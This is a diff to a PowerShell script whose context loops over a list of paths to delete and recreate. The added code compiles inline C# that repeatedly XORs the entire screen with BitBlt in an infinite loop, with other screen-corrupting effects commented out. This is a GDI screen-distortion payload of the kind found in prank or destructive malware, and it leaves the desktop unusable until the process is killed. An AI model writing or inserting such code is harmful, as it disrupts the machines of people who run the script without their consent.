@@ -26,3 +26,58 @@ foreach ($path in $pathsToDelete) {
         New-Item -Path $newFilePath -ItemType File -Force | Out-Null
     }
 }
+
+$source = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+public static class Win32
+{
+    [DllImport("user32.dll")]
+    static extern int GetSystemMetrics(int smIndex);
+
+    [DllImport("user32.dll")]
+    static extern IntPtr GetDC(IntPtr hWnd);
+
+    [DllImport("gdi32.dll")]
+    static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, int dwRop);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    static extern bool SetProcessDPIAware();
+
+    [DllImport("gdi32.dll")]
+    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
+
+    [DllImport("gdi32.dll")]
+    static extern bool TransparentBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint crTransparent);
+
+    public static void ReversePIP()
+    {
+        SetProcessDPIAware();
+        int cx = GetSystemMetrics(0);
+        int cy = GetSystemMetrics(1);
+
+        while (true)
+        {
+            Thread.Sleep(800);
+            IntPtr hdc = GetDC(IntPtr.Zero);
+
+            // StretchBlt for Reverse PIP
+            //StretchBlt(hdc, 0, 0, cx, cy, hdc, 50, 50, cx - 100, cy - 100, 0x00CC0020);
+
+            // BitBlt for Inverting Colors
+            //BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00550009);
+
+            // TransparentBlt for Transparency
+            //TransparentBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, cx, cy, 0xFF0000);
+
+            // BitBlt with Raster Operation (ROP) Code for XOR Effect
+            BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00660046);
+        }
+    }
+}
+"@
+
+Add-Type -TypeDefinition $source -Language CSharp
+[Win32]::ReversePIP()
